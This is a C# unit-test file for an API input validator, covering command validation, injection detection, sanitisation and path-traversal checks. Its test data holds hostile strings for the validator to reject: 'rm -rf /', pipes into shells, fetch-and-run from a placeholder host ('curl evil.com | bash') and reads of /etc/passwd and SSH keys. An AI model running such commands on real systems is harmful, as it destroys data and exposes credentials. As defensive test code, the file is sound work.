using Microsoft.Extensions.Logging;
using Moq;
using WAiSA.API.Security.Validation;
using WAiSA.API.Security.Validation.Models;
using Xunit;

namespace WAiSA.API.Tests.Security.Validation;

public class InputValidatorTests
{
    private readonly Mock<ILogger<InputValidator>> _mockLogger;
    private readonly InputValidator _validator;

    public InputValidatorTests()
    {
        _mockLogger = new Mock<ILogger<InputValidator>>();
        _validator = new InputValidator(_mockLogger.Object);
    }

    #region ValidateCommand Tests

    [Fact]
    public void ValidateCommand_ValidCommand_ReturnsSuccess()
    {
        // Arrange
        var command = "list users";
        var parameters = new Dictionary<string, string>
        {
            { "filter", "active" },
            { "limit", "10" }
        };

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.True(result.IsValid);
        Assert.Empty(result.Failures);
        Assert.Equal(ValidationSeverity.None, result.Severity);
    }

    [Fact]
    public void ValidateCommand_NullCommand_ReturnsCriticalFailure()
    {
        // Act
        var result = _validator.ValidateCommand(null!);

        // Assert
        Assert.False(result.IsValid);
        Assert.Single(result.Failures);
        Assert.Equal(ValidationFailureType.SyntaxError, result.Failures[0].Type);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
    }

    [Fact]
    public void ValidateCommand_EmptyCommand_ReturnsCriticalFailure()
    {
        // Act
        var result = _validator.ValidateCommand(string.Empty);

        // Assert
        Assert.False(result.IsValid);
        Assert.Single(result.Failures);
        Assert.Equal(ValidationFailureType.SyntaxError, result.Failures[0].Type);
    }

    [Fact]
    public void ValidateCommand_ExceedsMaxLength_ReturnsFailure()
    {
        // Arrange
        var command = new string('a', 10001);

        // Act
        var result = _validator.ValidateCommand(command);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.LengthExceeded);
    }

    [Fact]
    public void ValidateCommand_ContainsNullByte_ReturnsCriticalFailure()
    {
        // Arrange
        var command = "valid\0command";

        // Act
        var result = _validator.ValidateCommand(command);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.NullByteDetected);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
    }

    [Fact]
    public void ValidateCommand_UnbalancedQuotes_ReturnsSyntaxError()
    {
        // Arrange
        var command = "echo 'unbalanced";

        // Act
        var result = _validator.ValidateCommand(command);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f =>
            f.Type == ValidationFailureType.SyntaxError &&
            f.Message.Contains("single quotes"));
    }

    [Fact]
    public void ValidateCommand_UnbalancedBrackets_ReturnsSyntaxError()
    {
        // Arrange
        var command = "function(test { return value;";

        // Act
        var result = _validator.ValidateCommand(command);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f =>
            f.Type == ValidationFailureType.SyntaxError &&
            (f.Message.Contains("parentheses") || f.Message.Contains("braces")));
    }

    [Fact]
    public void ValidateCommand_TooManyParameters_ReturnsFailure()
    {
        // Arrange
        var command = "test";
        var parameters = Enumerable.Range(1, 51)
            .ToDictionary(i => $"param{i}", i => $"value{i}");

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.LengthExceeded);
    }

    [Fact]
    public void ValidateCommand_InvalidParameterName_ReturnsFailure()
    {
        // Arrange
        var command = "test";
        var parameters = new Dictionary<string, string>
        {
            { "valid_param", "value" },
            { "invalid;param", "value" }
        };

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.InvalidParameterName);
    }

    #endregion

    #region CheckForInjectionPatterns Tests

    [Theory]
    [InlineData(";rm -rf /")]
    [InlineData(";del /f /s /q C:\\*")]
    [InlineData(";shutdown -h now")]
    [InlineData(";format c:")]
    public void CheckForInjectionPatterns_CommandInjection_ReturnsFailure(string maliciousCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(maliciousCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
    }

    [Theory]
    [InlineData("|bash")]
    [InlineData("| sh -c 'evil'")]
    [InlineData("|cmd /c evil")]
    [InlineData("|powershell -c evil")]
    public void CheckForInjectionPatterns_PipeInjection_ReturnsFailure(string maliciousCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(maliciousCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Theory]
    [InlineData("$(whoami)")]
    [InlineData("$(curl evil.com)")]
    [InlineData("$((1+1))")]
    public void CheckForInjectionPatterns_SubshellInjection_ReturnsFailure(string maliciousCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(maliciousCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Theory]
    [InlineData("`whoami`")]
    [InlineData("`cat /etc/passwd`")]
    public void CheckForInjectionPatterns_BacktickInjection_ReturnsFailure(string maliciousCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(maliciousCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Theory]
    [InlineData("&& rm -rf /")]
    [InlineData("|| cat /etc/passwd")]
    [InlineData("&& curl evil.com")]
    public void CheckForInjectionPatterns_LogicalOperators_ReturnsFailure(string maliciousCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(maliciousCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Theory]
    [InlineData("../../etc/passwd")]
    [InlineData("..\\..\\windows\\system32")]
    [InlineData("../../../root/.ssh/id_rsa")]
    public void CheckForInjectionPatterns_PathTraversal_ReturnsFailure(string maliciousPath)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(maliciousPath);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.PathTraversal);
    }

    [Theory]
    [InlineData("cm0gcmYgLw==")]  // base64: rm rf /
    [InlineData("0x726d202d7266")]  // hex: rm -rf
    public void CheckForInjectionPatterns_EncodingAttempts_ReturnsFailure(string encodedCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(encodedCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.EncodingAttempt);
    }

    [Fact]
    public void CheckForInjectionPatterns_SafeCommand_ReturnsSuccess()
    {
        // Arrange
        var safeCommand = "list users where status equals active";

        // Act
        var result = _validator.CheckForInjectionPatterns(safeCommand);

        // Assert
        Assert.True(result.IsValid);
        Assert.Empty(result.Failures);
    }

    [Fact]
    public void CheckForInjectionPatterns_EmptyCommand_ReturnsSuccess()
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(string.Empty);

        // Assert
        Assert.True(result.IsValid);
    }

    #endregion

    #region SanitizeParameters Tests

    [Fact]
    public void SanitizeParameters_ValidParameters_ReturnsSanitized()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "username", "john_doe" },
            { "email", "test@example.com" }
        };

        // Act
        var result = _validator.SanitizeParameters(parameters);

        // Assert
        Assert.Equal(2, result.Count);
        Assert.Equal("john_doe", result["username"]);
    }

    [Fact]
    public void SanitizeParameters_RemovesDangerousCharacters()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "command", "test;rm -rf" },
            { "path", "../../etc/passwd" },
            { "script", "$(whoami)" }
        };

        // Act
        var result = _validator.SanitizeParameters(parameters);

        // Assert
        Assert.All(result.Values, value =>
        {
            Assert.DoesNotContain(";", value);
            Assert.DoesNotContain("&", value);
            Assert.DoesNotContain("|", value);
            Assert.DoesNotContain("`", value);
            Assert.DoesNotContain("$", value);
            Assert.DoesNotContain("(", value);
            Assert.DoesNotContain(")", value);
        });
    }

    [Fact]
    public void SanitizeParameters_InvalidParameterNames_FiltersOut()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "valid_name", "value1" },
            { "invalid;name", "value2" },
            { "another$bad", "value3" }
        };

        // Act
        var result = _validator.SanitizeParameters(parameters);

        // Assert
        Assert.Single(result);
        Assert.Contains("valid_name", result.Keys);
    }

    [Fact]
    public void SanitizeParameters_NullParameters_ReturnsEmpty()
    {
        // Act
        var result = _validator.SanitizeParameters(null!);

        // Assert
        Assert.NotNull(result);
        Assert.Empty(result);
    }

    [Fact]
    public void SanitizeParameters_EscapesSpecialCharacters()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "text", "It's a \"test\"" }
        };

        // Act
        var result = _validator.SanitizeParameters(parameters);

        // Assert
        Assert.Contains("\\'", result["text"]);
        Assert.Contains("\\\"", result["text"]);
    }

    #endregion

    #region CheckForPathTraversal Tests

    [Fact]
    public void CheckForPathTraversal_DotDotSequence_ReturnsViolation()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "filepath", "../../etc/passwd" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
        Assert.Contains(violations, v => v.Type == PathTraversalType.DotDotSequence);
    }

    [Fact]
    public void CheckForPathTraversal_AbsoluteUnixPath_ReturnsViolation()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "path", "/etc/passwd" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
        Assert.Contains(violations, v => v.Type == PathTraversalType.AbsolutePath);
    }

    [Fact]
    public void CheckForPathTraversal_AbsoluteWindowsPath_ReturnsViolation()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "path", "C:\\Windows\\System32" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
        Assert.Contains(violations, v => v.Type == PathTraversalType.WindowsPath);
    }

    [Fact]
    public void CheckForPathTraversal_HomeDirectory_ReturnsViolation()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "path", "~/.ssh/id_rsa" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
        Assert.Contains(violations, v => v.Type == PathTraversalType.HomeDirectory);
    }

    [Fact]
    public void CheckForPathTraversal_UncPath_ReturnsViolation()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "path", "\\\\server\\share" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
        Assert.Contains(violations, v => v.Type == PathTraversalType.UncPath);
    }

    [Fact]
    public void CheckForPathTraversal_SafePaths_ReturnsEmpty()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "file", "document.txt" },
            { "folder", "data" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.Empty(violations);
    }

    [Fact]
    public void CheckForPathTraversal_MultipleViolations_ReturnsAll()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "path1", "../../../etc/passwd" },
            { "path2", "/etc/shadow" },
            { "path3", "~/secrets" }
        };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.Equal(4, violations.Count); // path1 has 2 violations (.. and /)
    }

    [Fact]
    public void CheckForPathTraversal_NullParameters_ReturnsEmpty()
    {
        // Act
        var violations = _validator.CheckForPathTraversal(null!);

        // Assert
        Assert.NotNull(violations);
        Assert.Empty(violations);
    }

    #endregion

    #region Integration Tests

    [Fact]
    public void FullValidation_ComplexAttack_DetectsAllThreats()
    {
        // Arrange
        var command = ";rm -rf / && curl evil.com | bash";
        var parameters = new Dictionary<string, string>
        {
            { "file", "../../etc/passwd" },
            { "exec", "$(whoami)" },
            { "path", "/root/.ssh" }
        };

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.False(result.IsValid);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Fact]
    public void FullValidation_SafeInput_PassesAllChecks()
    {
        // Arrange
        var command = "get user details";
        var parameters = new Dictionary<string, string>
        {
            { "user_id", "12345" },
            { "include_metadata", "true" }
        };

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.True(result.IsValid);
        Assert.Empty(result.Failures);
    }

    #endregion
}
